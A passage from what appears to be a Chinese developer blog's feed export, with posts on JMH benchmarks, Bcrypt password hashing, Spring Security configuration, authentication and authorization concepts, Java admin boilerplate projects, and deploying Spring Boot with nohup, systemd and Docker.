基础性能报告</h2><p>下面是我写的常见场景的性能测试，例如 StringBuilder 比 new String() 速度快几个数量级。</p><table><thead><tr><th>Test</th><th>Mode</th><th>OPS</th><th>Unit</th></tr></thead><tbody><tr><td>“cn.printf.jmhreports.AutoBoxBenchmark.boxDataType”</td><td>“thrpt”</td><td>323693300.862712</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.AutoBoxBenchmark.primaryDataType”</td><td>“thrpt”</td><td>9421830157.195677</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.CacheValueBenchmark.test”</td><td>“thrpt”</td><td>204814.611974</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.CacheValueBenchmark.testStringBuilder”</td><td>“thrpt”</td><td>80039810.903665</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByAssignment”</td><td>“thrpt”</td><td>197815.644537</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByConstructor”</td><td>“thrpt”</td><td>205494.677150</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByStringBuilder”</td><td>“thrpt”</td><td>66162972.690813</td><td>ops/s</td></tr></tbody></table><p>代码仓库和持续更新的基准测试可以看下面的仓库。</p><p><a href="https://github.com/linksgo2011/jmh-reports" target="_blank" rel="noopener">https://github.com/linksgo2011/jmh-reports</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://openjdk.java.net/projects/code-tools/jmh/" target="_blank" rel="noopener">http://openjdk.java.net/projects/code-tools/jmh/</a></li><li><a href="https://github.com/melix/jmh-gradle-plugin" target="_blank" rel="noopener">https://github.com/melix/jmh-gradle-plugin</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 Bcrypt 代替 md5/sha1</title>
      <link href="/%E5%AE%89%E5%85%A8/security/safe-hash/"/>
      <url>/%E5%AE%89%E5%85%A8/security/safe-hash/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>如果数据库被“拖库”明文存储的密码就变得不安全。之前的做法是使用 md5 散列的方式，因为 md5 不可逆，无法从密文推出原文。</p><p>但是 HASH 算法最大的问题是，会发生撞库，也就是说，有可能出现多个原文得到同一个密码。</p><p>下面这个式子是存在的，如果原文是 M1，只需要另外一个同样 HASH 值的密码即可登录。</p><blockquote><p>MD5(M1) = MD5(M2) = MD5(M3)</p></blockquote><p>一种攻击方法是，攻击者记录了一张巨大的密码库，预先计算了常用密码的 hash 值，这样只需要搜索 hash 值就能寻找到一个合适的密码用于登录。</p><p>这就是被彩虹表攻击。</p><p>解决彩虹表的问题是加盐，在加密之前，对原文混入其他信息，混入的信息不存放到数据库中。实际寻找到其他原文也无法登录。</p><p>第二中攻击方法是王小云教授寻找到的一种新的方法，通过算法快速的找到 M2，这样不依赖彩虹表就可以实施攻击。</p><blockquote><p>MD5(M1) = MD5(M2)</p></blockquote><p>当被攻击者价值非常大，攻击者获取足够多的撞库原文，还是能分析盐值。</p><h2 id="Bcrypt"><a href="#Bcrypt" class="headerlink" title="Bcrypt"></a>Bcrypt</h2><p>Bcrypt 有两个特点</p><ul><li>每一次 HASH 出来的值不一样</li><li>计算非常缓慢</li></ul><p>因此使用 Bcrypt 进行加密后，攻击者想要使用算出 M2 成本变得不可接受。但代价是应用自身也会性能受到影响，不过登录行为并不是随时在发生，因此能够忍受。对于攻击者来说，需要不断计算，让攻击变得不太可能。</p><p>因此推荐使用 Bcrypt 进行密码加密。</p><h2 id="在-Java-中使用-Bcrypt"><a href="#在-Java-中使用-Bcrypt" class="headerlink" title="在 Java 中使用 Bcrypt"></a>在 Java 中使用 Bcrypt</h2><p>如果引入了 Spring Security, BCryptPasswordEncoder 提供了相关的方法。</p><pre><code>    public String encode(CharSequence rawPassword) {        String salt;        if (this.strength &gt; 0) {            if (this.random != null) {                salt = BCrypt.gensalt(this.strength, this.random);            } else {                salt = BCrypt.gensalt(this.strength);            }        } else {            salt = BCrypt.gensalt();        }        return BCrypt.hashpw(rawPassword.toString(), salt);    }</code></pre><p>BCryptPasswordEncoder 调用了另外一个类 BCrypt 完成加密操作，实际工作工作中可以直接使用 BCryptPasswordEncoder 类即可。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://blog.csdn.net/nnsword/article/details/78191292" target="_blank" rel="noopener">https://blog.csdn.net/nnsword/article/details/78191292</a></li><li><a href="https://www.cnblogs.com/qianjinyan/p/10636404.html" target="_blank" rel="noopener">https://www.cnblogs.com/qianjinyan/p/10636404.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring Security 基础</title>
      <link href="/Spring/spring/spring-security/"/>
      <url>/Spring/spring/spring-security/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Spring Security 主要解决用户的认证和授权问题，以及一些技术防护设施，例如 XSS、CSRF问题。</p><p>Spring Security 不仅仅解决权限和认证问题，还解决一些安全过滤，以及增加 HTTP 头部等能力。</p><p>基本概念</p><p>– SecurityContextHolder 存放认证上上下文信息 SecurityContext<br>– SecurityContext 存放 Authentication 以及一些请求信息，用于全局跨上下文访问<br>– Authentication  存放用户认证后的信息，用户名和权限列表<br>– UserDetails 用户信息，例如用户名、密码、是否过期<br>– UserDetailsService AuthenticationProvider 进行验证时，调用该服务获取用户信息<br>– UsernamePasswordAuthenticationToken 存放用户名和密码，用于后面的验证<br>– AuthenticationManager 支持多种验证方式进行验证，只要有一个验证通过即可，默认会加载 DaoAuthenticationProvider 进行验证<br>– AuthenticationEntryPoint 处理验证过程中的异常信息</p><h3 id="主要验证流程"><a href="#主要验证流程" class="headerlink" title="主要验证流程"></a>主要验证流程</h3><p><img src="/Spring/spring/spring-security/spring-security-flow.png" alt=""></p><h3 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h3><ul><li>用户认证阶段<ul><li>用户名密码认证过滤器</li><li>初始化 AuthenticationManager</li><li>循环验证  AuthenticationProvider<ul><li>AnonymousAuthenticationProvider</li><li>DaoProvider</li><li>RememberMeAuthenticationProvider</li></ul></li></ul></li><li>凭证验证阶段<ul><li>获取 session 管理器</li><li>AccessDecisionManager 决定是否放行</li></ul></li></ul><h4 id="表单认证"><a href="#表单认证" class="headerlink" title="表单认证"></a>表单认证</h4><ul><li>spring security 会注册 filter 然后提供 login page</li><li>用户提交后命中 userpassword 过滤器</li><li>AuthenticationProvider 检查注册的 Provider</li></ul><h4 id="Token-无状态认证"><a href="#Token-无状态认证" class="headerlink" title="Token 无状态认证"></a>Token 无状态认证</h4><ul><li>设置 session 认证方式为无状态</li><li>每一次请求都拿从 redis、jwt 中取出的用户信息重新 auth 一次</li><li>无状态认证会带来一些性能的开销</li></ul><h2 id="security-注册的-filter"><a href="#security-注册的-filter" class="headerlink" title="security 注册的 filter"></a>security 注册的 filter</h2><p>在 FilterComparator 中可以找到</p><pre><code>    FilterComparator() {        Step order = new Step(INITIAL_ORDER, ORDER_STEP);        put(ChannelProcessingFilter.class, order.next());        put(ConcurrentSessionFilter.class, order.next());        put(WebAsyncManagerIntegrationFilter.class, order.next());        put(SecurityContextPersistenceFilter.class, order.next());        put(HeaderWriterFilter.class, order.next());        put(CorsFilter.class, order.next());        put(CsrfFilter.class, order.next());        put(LogoutFilter.class, order.next());        filterToOrder.put(            &quot;org.springframework.security.oauth2.client.web.OAuth2AuthorizationRequestRedirectFilter&quot;,                order.next());        put(X509AuthenticationFilter.class, order.next());        put(AbstractPreAuthenticatedProcessingFilter.class, order.next());        filterToOrder.put(&quot;org.springframework.security.cas.web.CasAuthenticationFilter&quot;,                order.next());        filterToOrder.put(            &quot;org.springframework.security.oauth2.client.web.OAuth2LoginAuthenticationFilter&quot;,                order.next());        put(UsernamePasswordAuthenticationFilter.class, order.next());        put(ConcurrentSessionFilter.class, order.next());        filterToOrder.put(                &quot;org.springframework.security.openid.OpenIDAuthenticationFilter&quot;, order.next());        put(DefaultLoginPageGeneratingFilter.class, order.next());        put(DefaultLogoutPageGeneratingFilter.class, order.next());        put(ConcurrentSessionFilter.class, order.next());        put(DigestAuthenticationFilter.class, order.next());        filterToOrder.put(                &quot;org.springframework.security.oauth2.server.resource.web.BearerTokenAuthenticationFilter&quot;, order.next());        put(BasicAuthenticationFilter.class, order.next());        put(RequestCacheAwareFilter.class, order.next());        put(SecurityContextHolderAwareRequestFilter.class, order.next());        put(JaasApiIntegrationFilter.class, order.next());        put(RememberMeAuthenticationFilter.class, order.next());        put(AnonymousAuthenticationFilter.class, order.next());        filterToOrder.put(            &quot;org.springframework.security.oauth2.client.web.OAuth2AuthorizationCodeGrantFilter&quot;,                order.next());        put(SessionManagementFilter.class, order.next());        put(ExceptionTranslationFilter.class, order.next());        put(FilterSecurityInterceptor.class, order.next());        put(SwitchUserFilter.class, order.next());    }</code></pre><h2 id="HttpSecurity-配置规则说明"><a href="#HttpSecurity-配置规则说明" class="headerlink" title="HttpSecurity 配置规则说明"></a>HttpSecurity 配置规则说明</h2><pre><code>protected void configure(HttpSecurity http) throws Exception {    http        .authorizeRequests()                                                                            .antMatchers(&quot;/resources/**&quot;, &quot;/signup&quot;, &quot;/about&quot;).permitAll()                              .antMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)                                                  .antMatchers(&quot;/db/**&quot;).access(&quot;hasRole(&#39;ADMIN&#39;) and hasRole(&#39;DBA&#39;)&quot;)                        .anyRequest().authenticated()                                                               .and()        // ...        .formLogin();}</code></pre><ul><li>http.authorizeRequests()方法有多个子节点，每个macher按照他们的声明顺序执行。</li><li>我们指定任何用户都可以通过访问的多个URL模式。任何用户都可以访问URL以”/resources/“, equals “/signup”, 或者 “/about”开头的URL。</li><li>以 “/admin/“ 开头的URL只能由拥有 “ROLE_ADMIN”角色的用户访问。请注意我们使用 hasRole 方法，没有使用 “ROLE_” 前缀.</li><li>任何以”/db/“ 开头的URL需要用户同时具有 “ROLE_ADMIN” 和 “ROLE_DBA”。和上面一样我们的 hasRole 方法也没有使用 “ROLE_” 前缀.</li><li>尚未匹配的任何URL要求用户进行身份验证</li></ul><h2 id="JDBC-验证"><a href="#JDBC-验证" class="headerlink" title="JDBC 验证"></a>JDBC 验证</h2><pre><code>@Autowiredprivate DataSource dataSource;@Autowiredpublic void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {    auth        .jdbcAuthentication()            .dataSource(dataSource)            .withDefaultSchema()            .withUser(&quot;user&quot;).password(&quot;password&quot;).roles(&quot;USER&quot;).and()            .withUser(&quot;admin&quot;).password(&quot;password&quot;).roles(&quot;USER&quot;, &quot;ADMIN&quot;);}</code></pre><p>如果需要提供自己的验证器实现 AuthenticationProvider</p><pre><code>@Beanpublic SpringAuthenticationProvider springAuthenticationProvider() {    return new SpringAuthenticationProvider();}</code></pre><h2 id="UserDetailsService"><a href="#UserDetailsService" class="headerlink" title="UserDetailsService"></a>UserDetailsService</h2><pre><code>@Beanpublic SpringDataUserDetailsService springDataUserDetailsService() {    return new SpringDataUserDetailsService();}</code></pre><h2 id="定义密码加密方式"><a href="#定义密码加密方式" class="headerlink" title="定义密码加密方式"></a>定义密码加密方式</h2><pre><code>@Beanpublic BCryptPasswordEncoder passwordEncoder() {    return new BCryptPasswordEncoder();}</code></pre><h2 id="给方法添加权限检查-EnableGlobalMethodSecurity"><a href="#给方法添加权限检查-EnableGlobalMethodSecurity" class="headerlink" title="给方法添加权限检查 EnableGlobalMethodSecurity"></a>给方法添加权限检查 EnableGlobalMethodSecurity</h2><p>我们可以在任何使用@Configuration的实例上，使用@EnableGlobalMethodSecurity注解来启用基于注解的安全性。例如下面会启用Spring的@Secured注解。</p><pre><code>@EnableGlobalMethodSecurity(securedEnabled = true)public class MethodSecurityConfig {// ...}例如，通过  PreAuthorize 可以控制用户的访问 @PreAuthorize(&quot;hasRole(&#39;admin&#39;)&quot;) @RequestMapping(value = &quot;/user/&quot;, method = RequestMethod.GET) @ResponseBody public List&lt;User&gt; listAllUsers() {   List&lt;User&gt; users = userService.findAll();   if(users.isEmpty()){       return null;         }         return users; }</code></pre><h2 id="使用-token-方式鉴权"><a href="#使用-token-方式鉴权" class="headerlink" title="使用 token 方式鉴权"></a>使用 token 方式鉴权</h2><p><img src="/Spring/spring/spring-security/spring-security-jwt-authentication-architecture-diagram.png" alt=""></p><p>参考资料 <a href="https://grokonez.com/spring-framework/spring-security/spring-boot-spring-security-jwt-authentication-architecture-tutorial" target="_blank" rel="noopener">https://grokonez.com/spring-framework/spring-security/spring-boot-spring-security-jwt-authentication-architecture-tutorial</a></p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>关于Spring Security中无Session和无状态stateless <a href="https://www.cnblogs.com/Mainz/p/3230077.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mainz/p/3230077.html</a></li><li>SpringSecurity原理剖析与权限系统设计 <a href="https://www.cnblogs.com/fanzhidongyzby/archive/2019/09/29/11610334.html" target="_blank" rel="noopener">https://www.cnblogs.com/fanzhidongyzby/archive/2019/09/29/11610334.html</a></li><li>Spring Security用户认证流程源码详解 <a href="https://blog.csdn.net/qq_37142346/article/details/80032336" target="_blank" rel="noopener">https://blog.csdn.net/qq_37142346/article/details/80032336</a></li><li>中文文档 <a href="https://www.springcloud.cc/spring-security-zhcn.html#getting-starteda" target="_blank" rel="noopener">https://www.springcloud.cc/spring-security-zhcn.html#getting-starteda</a></li><li>Config Spring Security for Restful API <a href="https://www.baeldung.com/securing-a-restful-web-service-with-spring-security" target="_blank" rel="noopener">https://www.baeldung.com/securing-a-restful-web-service-with-spring-security</a></li><li><a href="https://spring.io/guides/gs/securing-web/" target="_blank" rel="noopener">https://spring.io/guides/gs/securing-web/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>认证和授权的基本概念</title>
      <link href="/%E5%AE%89%E5%85%A8/security/iam/"/>
      <url>/%E5%AE%89%E5%85%A8/security/iam/</url>
      
        <content type="html"><![CDATA[<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>认证是 authentication，指的是当前用户的身份，当用户登陆过后系统便能追踪到他的身份做出符合相应业务逻辑的操作。即使用户没有登录，大多数系统也会追踪他的身份，只是当做来宾或者匿名用户来处理。认证技术解决的是 “我是谁？”的问题。</p><h2 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h2><p>授权是 authorization，指的是什么样的身份被允许访问某些资源，在获取到用户身份后继续检查用户的权限。单一的系统授权往往是伴随认证来完成的，但是在开放 API 的多系统结构下，授权可以由不同的系统来完成，例如 OAuth。授权技术是解决“我能做什么？”的问题。</p><h2 id="凭证"><a href="#凭证" class="headerlink" title="凭证"></a>凭证</h2><p>实现认证和授权的基础是需要一种媒介（credentials）来标记访问者的身份或权利，在现实生活中每个人都需要一张身份证才能访问自己的银行账户、结婚和办理养老保险等，这就是认证的凭证；在古代军事活动中，皇帝会给出战的将军颁发兵符，下级将领不关心持有兵符的人，只需要执行兵符对应的命令即可。在互联网世界中，服务器为每一个访问者颁发 session ID 存放到 cookie，这就是一种凭证技术。数字凭证还表现在方方面面，SSH 登录的密匙、JWT 令牌、一次性密码等。</p><h2 id="一些权限模型"><a href="#一些权限模型" class="headerlink" title="一些权限模型"></a>一些权限模型</h2><h3 id="RBAC"><a href="#RBAC" class="headerlink" title="RBAC"></a>RBAC</h3><p>RBAC  是基于角色的访问控制（Role-Based Access Control ）在 RBAC  中，权限与角色相关联，用户通过成为适当角色的成员而得到这些角色的权限。</p><h3 id="ABAC"><a href="#ABAC" class="headerlink" title="ABAC"></a>ABAC</h3><p>ABAC（Attribute Base Access Control） 基于属性的权限控制，用于解决权限和对象之间的关系，例如用户有创建贴吧的权限，但是删除某个贴吧，需要具体某个仓库的权限。</p><h2 id="IAM-设计检查清单"><a href="#IAM-设计检查清单" class="headerlink" title="IAM 设计检查清单"></a>IAM 设计检查清单</h2><ul><li>登录时把其他人挤下线</li><li>图形验证码</li><li>撤回和注销</li><li>密码修改</li><li>密码输入错误次数</li><li>用户锁定</li><li>检查密码是否过期</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://www.printf.cn/index.php/archives/api-authentication-authorization-credential.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-authentication-authorization-credential.html</a></li><li><a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/overview" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/azure/role-based-access-control/overview</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 一些开源后台管理种子项目</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-admin-boilerplate/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-admin-boilerplate/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们做的业务系统大部分都是 xxx 管理系统，除了独有的业务逻辑之外，大部分都有一些公共的业务需求</p><ul><li>权限管理</li><li>登录登出</li><li>图片上传</li><li>列表</li><li>表单</li><li>支付</li><li>…</li></ul><p>于是很多人做了一些后台管理的脚手架，我整理了一些，吸收一些好的东西和方法到系统中。</p><h2 id="https-github-com-elunez-eladmin"><a href="#https-github-com-elunez-eladmin" class="headerlink" title="https://github.com/elunez/eladmin"></a><a href="https://github.com/elunez/eladmin" target="_blank" rel="noopener">https://github.com/elunez/eladmin</a></h2><p>项目基于 Spring Boot 2.1.0 、 Jpa、 Spring Security、redis、Vue的前后端分离的后台管理系统，项目采用分模块开发方式， 权限控制采用 RBAC，支持数据字典与数据权限管理，支持一键生成前后端代码，支持动态路由 </p><h2 id="https-github-com-white-cat-jeeweb"><a href="#https-github-com-white-cat-jeeweb" class="headerlink" title="https://github.com/white-cat/jeeweb"></a><a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></h2><p>JEEWEB是一款基于SpringMVC+Spring+Hibernate的JAVA WEB敏捷开发系统；它是一款具有代码生成功能的智能快速开发平台；是以Spring Framework为核心容器，Spring MVC为模型视图控制器，Hibernate为数据访问层， Apache Shiro为权限授权层，Ehcahe对常用数据进行缓存，Disruptor作为并发框架，Bootstrap作为前端框架的优秀开源系统。</p><h2 id="https-github-com-lmxdawn-vue-admin-java"><a href="#https-github-com-lmxdawn-vue-admin-java" class="headerlink" title="https://github.com/lmxdawn/vue-admin-java"></a><a href="https://github.com/lmxdawn/vue-admin-java" target="_blank" rel="noopener">https://github.com/lmxdawn/vue-admin-java</a></h2><p>spring boot + mybatis + vue + element-ui 实现后台管理API接口</p><h2 id="https-gitee-com-xiandafu-springboot-plus"><a href="#https-gitee-com-xiandafu-springboot-plus" class="headerlink" title="https://gitee.com/xiandafu/springboot-plus"></a><a href="https://gitee.com/xiandafu/springboot-plus" target="_blank" rel="noopener">https://gitee.com/xiandafu/springboot-plus</a></h2><p>一个基于SpringBoot 2 的管理后台系统,有数十个基于此的商业应用，包含了用户管理，组织机构管理，角色管理，功能点管理，菜单管理，权限分配，数据权限分配，代码生成等功能 相比其他开源的后台开发平台脚手架，SpringBoot-Plus 使用简单，可以轻易完成中型，大型系统开发。</p><h2 id="https-github-com-yangzongzhuan-RuoYi"><a href="#https-github-com-yangzongzhuan-RuoYi" class="headerlink" title="https://github.com/yangzongzhuan/RuoYi"></a><a href="https://github.com/yangzongzhuan/RuoYi" target="_blank" rel="noopener">https://github.com/yangzongzhuan/RuoYi</a></h2><p>基于SpringBoot2.0的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro没有任何其它重度依赖。直接运行即可用。</p><h2 id="https-github-com-lihengming-spring-boot-api-project-seed"><a href="#https-github-com-lihengming-spring-boot-api-project-seed" class="headerlink" title="https://github.com/lihengming/spring-boot-api-project-seed"></a><a href="https://github.com/lihengming/spring-boot-api-project-seed" target="_blank" rel="noopener">https://github.com/lihengming/spring-boot-api-project-seed</a></h2><p>Spring Boot API Project Seed 是一个基于Spring Boot &amp; MyBatis的种子项目，用于快速构建中小型API、RESTful API项目，没有后台管理系统，只有一个 API。</p><h2 id="https-gitee-com-naan1993-guns"><a href="#https-gitee-com-naan1993-guns" class="headerlink" title="https://gitee.com/naan1993/guns/"></a><a href="https://gitee.com/naan1993/guns/" target="_blank" rel="noopener">https://gitee.com/naan1993/guns/</a></h2><p>Guns基于Spring Boot2，致力于做更简洁的后台管理系统。包含系统管理，代码生成，多数据库适配，SSO单点登录，工作流，短信，邮件发送，OAuth2登录，任务调度，持续集成，docker部署等功。支持Spring Cloud Alibaba微服务。社区活跃，版本迭代快，加群免费技术支持。</p><h2 id="https-github-com-paascloud-paascloud-master"><a href="#https-github-com-paascloud-paascloud-master" class="headerlink" title="https://github.com/paascloud/paascloud-master"></a><a href="https://github.com/paascloud/paascloud-master" target="_blank" rel="noopener">https://github.com/paascloud/paascloud-master</a></h2><p>spring cloud + vue + oAuth2.0全家桶实战，前后端分离模拟商城，完整的购物流程、后端运营平台，可以实现快速搭建企业级微服务项目。支持微信登录等三方登录。</p><h2 id="https-github-com-macrozheng-mall"><a href="#https-github-com-macrozheng-mall" class="headerlink" title="https://github.com/macrozheng/mall"></a><a href="https://github.com/macrozheng/mall" target="_blank" rel="noopener">https://github.com/macrozheng/mall</a></h2><p>mall项目是一套电商系统，包括前台商城系统及后台管理系统，基于SpringBoot+MyBatis实现。 前台商城系统包含首页门户、商品推荐、商品搜索、商品展示、购物车、订单流程、会员中心、客户服务、帮助中心等模块。 后台管理系统包含商品管理、订单管理、会员管理、促销管理、运营管理、内容管理、统计报表、财务管理、权限管理、设置等模块。</p><h2 id="https-github-com-huanzi-qch-base-admin"><a href="#https-github-com-huanzi-qch-base-admin" class="headerlink" title="https://github.com/huanzi-qch/base-admin"></a><a href="https://github.com/huanzi-qch/base-admin" target="_blank" rel="noopener">https://github.com/huanzi-qch/base-admin</a></h2><p>Base Admin一套简单通用的后台管理系统<br>这套Base Admin是一套简单通用的后台管理系统，主要功能有：权限管理、菜单管理、用户管理，系统设置、实时日志，实时监控，API加密，以及登录用户修改密码、配置个性菜单等</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 部署的几种方式</title>
      <link href="/Spring/spring/spring-boot-deploy/"/>
      <url>/Spring/spring/spring-boot-deploy/</url>
      
        <content type="html"><![CDATA[<h2 id="打包-Spring-Boot-应用"><a href="#打包-Spring-Boot-应用" class="headerlink" title="打包 Spring Boot 应用"></a>打包 Spring Boot 应用</h2><p>推荐使用 Spring Boot 的 jar 包进行部署，自带容器对环境依赖。当然也可以打包成 war 格式，并部署到 Servlet3.0 或者早期的 Servlet2.0 的容器中。</p><p>使用 Maven 或者 Gradle 打包 jar 文件,一般在工程中使用 wapper 构建。</p><p>可以通过 Initializr 构建一个基本的 SPring Boot 项目练习， <a href="https://start.spring.io/" target="_blank" rel="noopener">https://start.spring.io/</a> </p><h2 id="使用-Maven-构建"><a href="#使用-Maven-构建" class="headerlink" title="使用 Maven 构建"></a>使用 Maven 构建</h2><p>在 Maven 的 pom.xml 文件中配置如下插件。</p><pre><code>    &lt;build&gt;        &lt;plugins&gt;            ...            &lt;plugin&gt;                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;</code></pre><p>在工程目录下的命令行运行 <code>./mvnw clean package</code></p><blockquote><p>./mvnw clean package </p></blockquote><p>构建成功后可以看到下面的信息。</p><pre><code>[INFO] --- maven-jar-plugin:3.1.2:jar (default-jar) @ spring-boot-boilerplate ---[INFO] Building jar: /Users/nlin/Downloads/spring-boot-boilerplate/target/spring-boot-boilerplate-0.0.1-SNAPSHOT.jar[INFO] [INFO] --- spring-boot-maven-plugin:2.2.1.RELEASE:repackage (repackage) @ spring-boot-boilerplate ---[INFO] Replacing main artifact with repackaged archive[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time:  4.237 s[INFO] Finished at: 2019-11-17T22:28:04+08:00[INFO] ------------------------------------------------------------------------</code></pre><h3 id="使用-gradle-构建"><a href="#使用-gradle-构建" class="headerlink" title="使用 gradle 构建"></a>使用 gradle 构建</h3><p>在 build.gradle 文件中有如下配置， org.springframework.boot 是用来运行和构建 Spring Boot 应用程序的，io.spring.dependency-management 是用来管理 Spring 项目各个依赖的版本，让其保持一致。</p><pre><code>plugins {    id &#39;org.springframework.boot&#39; version &#39;2.1.3.RELEASE&#39;    id &quot;io.spring.dependency-management&quot; version &quot;1.0.3.RELEASE&quot;}</code></pre><p>运行命令</p><blockquote><p>./gradle clean package </p></blockquote><p>我的项目名称是 spring-boot-boilerplate，因此制品是 spring-boot-boilerplate-0.0.1-SNAPSHOT.jar</p><h2 id="使用-Linux-命令-nohup-部署"><a href="#使用-Linux-命令-nohup-部署" class="headerlink" title="使用 Linux 命令 nohup 部署"></a>使用 Linux 命令 nohup 部署</h2><p>可以通过 <code>java -jar</code> 来运行 jar 文件，但是关闭窗口后会挂断应用程序，因此可以使用 <code>nohup</code> 来持续运行，需要注意的是使用 <code>nohup</code> 需要修改日志文件的流向 log.txt。</p><p>但 <code>nohup</code> 只是不挂断程序，不是指在后台运行，因此部署 Spring Boot 应用程序，还需要 <code>&amp;</code>。<code>&amp;</code> 指后台运行。</p><blockquote><p>nohup java -jar spring-boot-boilerplate-0.0.1-SNAPSHOT.jar &gt; log.txt &amp;</p></blockquote><p>这条需要在部署的服务器上运行，我们可以编写一个简单的 shell 脚本来完成。工作中，更多的是使用 ansible 脚本用于多台服务器批量操作。</p><p>先设置 ssh key，确保自己能使用 ssh 无密码能访问到目标服务器。然后通过 scp 拷贝文件到服务器。</p><blockquote><p> scp spring-boot-boilerplate-0.0.1-SNAPSHOT.jar <a href="mailto:root@192.168.1.86" target="_blank" rel="noopener">root@192.168.1.86</a>:/home/workspace</p></blockquote><p>192.168.1.86 为一台内网服务器地址。</p><p>然后通过远程执行 shell 脚本命令启动</p><blockquote><p> ssh <a href="mailto:root@192.168.1.86" target="_blank" rel="noopener">root@192.168.1.86</a> ‘nohup java -jar /home/workspace/spring-boot-boilerplate-0.0.1-SNAPSHOT.jar &gt; log.txt &amp;’</p></blockquote><p>启动之前需要杀死之前运行的 java 程序，否则会端口被占用。根据端口杀死占用的进程</p><blockquote><p>ssh <a href="mailto:root@192.168.1.86" target="_blank" rel="noopener">root@192.168.1.86</a> ‘output=$( netstat -apn | grep 8080 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ } &amp;&amp; kill -9 $num5 || pwd’</p></blockquote><h2 id="通过注册服务运行"><a href="#通过注册服务运行" class="headerlink" title="通过注册服务运行"></a>通过注册服务运行</h2><p>上面的方法比较简单，但是有一个问题，部署之后如果服务器重启需要再次启动程序。可以将 <code>java -jar xxx.jar</code> 这条命令作为服务注册到系统中，也可以方便的提供启动、销毁的方法供系统启动的时候使用。 </p><p>可以使用 <code>systemd</code> 的一系列方法，同时 ansible 等自动化工具也提供了非常方便的 API。</p><p>创建一个 service 文件</p><blockquote><p>vim spring-boot-boilerplate.service </p></blockquote><p>然后添加配置。</p><pre><code>[Unit]Description=spring-boot-boilerplate java applicationAfter=syslog.target[Service]ExecStart=/usr/bin/nohup /usr/bin/java -jar /home/workspace/spring-boot-boilerplate.jar --spring.profiles.active=devSuccessExitStatus=143[Install]WantedBy=multi-user.target</code></pre><p>ExecStart 填写 java 应用启动命令，当 <code>systemctl start</code> 的时候会调用这个命令。注意依然需要使用 <code>nohup</code> 保持后台运行。</p><p>配置完成后拷贝 service 文件到系统目录</p><blockquote><p>mv spring-boot-boilerplate.service /usr/lib/systemd/system/spring-boot-boilerplate.service</p></blockquote><p>然后启动</p><blockquote><p>systemctl start spring-boot-boilerplate</p></blockquote><p>可以通过 <code>systemctl status</code> 查看状态，也能看到启动的日志，如果有错误这个时候能看到异常信息。</p><blockquote><p>systemctl status spring-boot-boilerplate</p></blockquote><p>另外，不要忘记允许开机启动。</p><blockquote><p>systemctl enable spring-boot-boilerplate</p></blockquote><h2 id="使用-docker-运行"><a href="#使用-docker-运行" class="headerlink" title="使用 docker 运行"></a>使用 docker 运行</h2><p>使用 docker 运行 Spring Boot 就非常简单了，编译完成 jar 文件之后，只需要编写一个 Dockerfile</p><blockquote><p>vim Dockerfile</p></blockquote><pre><code>FROM openjdk:8-jdk-slimVOLUME /tmpADD target/spring-boot-boilerplate.jar app.jarENTRYPOINT [&quot;java&quot;, &quot;-jar&quot;, &quot;/app.jar&quot;]</code></pre><p>cd 目录到当前目录下</p><blockquote><p>docker build -t spring-boot-docker  .</p></blockquote><p>使用 docker 查看构建出来的镜像</p><blockquote><p>docker images</p></blockquote><p>运行镜像，并将容器内端口（9999）映射到 8080</p><blockquote><p>docker run -it -p 9999:8080 spring-boot-docker</p></blockquote><p>如果单体机器可以直接使用 <code>nohup</code> 运行即可</p><blockquote><p>nohup docker run -it -p 